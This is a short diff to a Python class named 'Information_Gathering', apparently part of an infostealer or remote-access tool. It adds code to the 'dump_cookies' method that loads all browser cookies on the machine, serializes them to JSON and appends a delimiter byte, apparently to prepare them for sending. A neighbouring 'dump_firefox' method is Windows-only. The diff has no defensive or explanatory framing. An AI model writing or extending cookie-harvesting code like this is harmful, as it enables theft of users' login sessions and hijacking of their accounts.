@@ -87,6 +87,9 @@ class Information_Gathering:
 		
 	def dump_cookies(self):
 		cookie_dict = browsercookie.load()._cookies
+		serialized = json.dumps(cookie_dict)
+		
+		return serialized+chr(253)
 		
 	@windows_only
 	def dump_firefox(self): 
